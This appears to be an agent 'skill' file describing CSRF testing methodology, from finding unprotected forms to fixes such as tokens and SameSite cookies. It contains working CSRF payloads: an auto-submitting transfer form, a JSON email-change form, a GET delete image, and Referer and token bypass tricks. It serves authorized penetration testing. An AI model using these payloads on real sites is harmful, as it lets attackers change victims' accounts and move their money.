---
name: csrf-testing
Description: Professional skills and methodology for CSRF cross-site request forgery testing
version: 1.0.0
---

# CSRF cross-site request forgery test

## Overview

CSRF (Cross-Site Request Forgery) is an attack method that uses the user's logged-in status to perform unauthorized operations. This skill provides detection, utilization and protection methods for CSRF vulnerabilities.

## Vulnerability principle

- Attackers induce users to visit malicious pages
- The malicious page automatically sends a request to the target website
- The browser automatically carries the user's authentication information (Cookie, Session)
- The target website mistakenly believes that the user is operating legitimately

## Test method

### 1. Identify sensitive operations

- Password change
- Email modification
- Transfer operations
- Permission changes
- Data deletion
- Status updates

### 2. Detect CSRF Token

**Check if there is Token protection:**
```html
<!-- 有Token保护 -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- 无Token保护 - 存在CSRF风险 -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Verify Token validity

**Test whether the Token is predictable:**
- Whether the Token is based on timestamp
- Whether the token is based on user ID
- Whether the Token can be reused
- Whether the token is shared between multiple requests

### 4. Check Referer verification

**Test Referer check to see if it can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Test bypass
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (empty)
```

## Leverage technology

### Basic CSRF attack

**HTML form automatic submission:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypass Content-Type check:**
```html
<!-- 使用form表单提交JSON -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET request CSRF

**Attack using GET request:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass technology

### Token bypass

**If Token is in Cookie:**
```javascript
// If the Token exists in both the cookie and the form
// You can try to submit only the Token in the cookie
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // Does not contain the csrf_token parameter and relies on Cookie
});
```

### SameSite Cookie Bypass

**Utilizing subdomains:**
- If SameSite=Lax, GET requests can still carry cookies
- Attack using subdomain names

### Double submission cookie

**Bypass Token verification:**
```html
<!-- 如果Token在Cookie中，且验证逻辑有缺陷 -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Read Token from Cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tool usage

### Burp Suite

**Use CSRF PoC Generator:**
1. Intercept target requests
2. Right click → Engagement tools → Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# Use ZAP for CSRF scanning
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Validation and reporting

### Verification steps

1. Confirm that the target operation is not protected by CSRF Token
2. Construct a malicious request and verify that it is executable
3. Assess the impact (data leakage, privilege escalation, financial loss, etc.)
4. Record a complete POC

### Report Highlights

- Location of the vulnerability and affected operations
- Attack scenarios and scope of impact
- Complete exploitation steps and PoC
- Repair suggestions (CSRF Token, SameSite Cookie, Referer verification, etc.)

## Protective measures

### Recommended plan

1. **CSRF Token**
- Each form contains a unique Token
-Token is stored in Session
- Verify Token validity

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double Submit Cookie**
- Token exists in both cookies and forms
- Verify that both match

4. **Referer verification**
- Verify whether the Referer is of the same origin
- Pay attention to the handling of empty Referer

## Notes

- Only conducted in an authorized testing environment
- Avoid any real impact on user accounts
- Document all testing steps
- Consider differences in behavior across browsers